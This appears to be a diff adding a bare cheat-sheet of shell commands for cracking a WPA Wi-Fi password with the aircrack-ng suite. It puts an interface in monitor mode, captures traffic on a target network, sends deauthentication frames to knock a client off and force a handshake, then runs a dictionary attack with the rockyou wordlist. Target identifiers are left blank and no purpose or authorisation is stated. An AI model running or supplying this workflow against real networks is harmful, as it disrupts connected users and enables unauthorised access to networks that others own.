@@ -1,0 +1,17 @@
+rm -rf temp/*
+
+airmon-ng start wlan0
+#airmon-ng stop wlan0
+
+====================
+#airmon-ng check kill
+
+airodump-ng wlan0mon
+airodump-ng -c --bssid -w temp/ wlan0mon
+====================
+#wait for handshake
+
+#try to brake with station
+aireplay-ng -0 10 -a -c wlan0mon
+
+aircrack-ng -a2 -b -w rockyou.txt temp/-01.cap
